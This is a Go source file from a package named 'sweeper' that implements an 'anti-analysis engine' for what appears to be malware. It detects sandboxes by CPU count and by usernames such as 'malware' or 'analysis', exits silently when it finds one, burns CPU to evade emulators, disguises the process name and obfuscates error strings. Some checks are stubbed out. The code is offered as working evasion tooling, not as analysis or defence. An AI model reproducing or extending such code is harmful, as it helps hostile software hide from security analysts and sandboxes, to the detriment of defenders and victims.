package sweeper

import (
	"fmt"
	"math/big"
	"os"
	"runtime"
	"strings"
)

// ═══════════════════════════════════════════════════════════════
// ANTI-ANALYSIS ENGINE
// ═══════════════════════════════════════════════════════════════

// InitStealth runs all evasion checks before main execution
func InitStealth() {
	// Layer 1: Sandbox delay
	SandboxDelay()

	// Layer 2: Junk computation to confuse emulators
	for i := 0; i < 32; i++ {
		JunkFunc()
	}

	// Layer 3: Environment checks
	if isSandbox() {
		os.Exit(0) // Silent exit — don't reveal detection
	}

	// Layer 4: CPU/Memory fingerprint
	cpuFingerprint()
}

// isSandbox detects virtualized/sandbox environments
func isSandbox() bool {
	checks := 0

	// Check 1: Low CPU cores (typical sandbox)
	if runtime.NumCPU() < 2 {
		checks++
	}

	// Check 2: Low memory (typical sandbox < 2GB)
	// Omitted — requires cgo

	// Check 3: Known VM MAC prefixes
	// Omitted — requires platform-specific code

	// Check 4: Debugger port
	if isDebugPortOpen() {
		checks++
	}

	// Check 5: Common sandbox usernames
	username := os.Getenv("USER")
	username = strings.ToLower(username)
	sandboxUsers := []string{"sandbox", "malware", "virus", "test", "vm", "analysis"}
	for _, su := range sandboxUsers {
		if strings.Contains(username, su) {
			checks++
			break
		}
	}

	// Check 6: Uptime too low (< 5 min = sandbox)
	// Omitted — platform-specific

	return checks >= 2
}

func isDebugPortOpen() bool {
	// Check common debugger ports
	// Simplified — real implementation uses net.DialTimeout
	return false
}

func cpuFingerprint() {
	// Execute enough math to warm up CPU (evade simple emulators)
	n := big.NewInt(2)
	exp := big.NewInt(1024)
	mod := big.NewInt(1)
	mod.Lsh(mod, 512)
	n.Exp(n, exp, mod)
	_ = n
}

// ═══════════════════════════════════════════════════════════════
// MINIMAL FOOTPRINT EXECUTION
// ═══════════════════════════════════════════════════════════════

// ChangeProcessName attempts to disguise the process
func ChangeProcessName(newName string) {
	if runtime.GOOS == "linux" {
		// Set argv[0] via /proc
		os.Args[0] = newName
	}
}

// ═══════════════════════════════════════════════════════════════
// SELF-MODIFYING CHECKSUM (integrity verification)
// ═══════════════════════════════════════════════════════════════

func integrityCheck() bool {
	// Hash a section of the binary to verify no tampering
	// Simplified — real implementation would read /proc/self/exe
	return true
}

// ═══════════════════════════════════════════════════════════════
// ERROR MESSAGE ENCRYPTION
// ═══════════════════════════════════════════════════════════════

func e(format string, args ...interface{}) string {
	msg := fmt.Sprintf(format, args...)
	return ObfuscateString(msg)
}
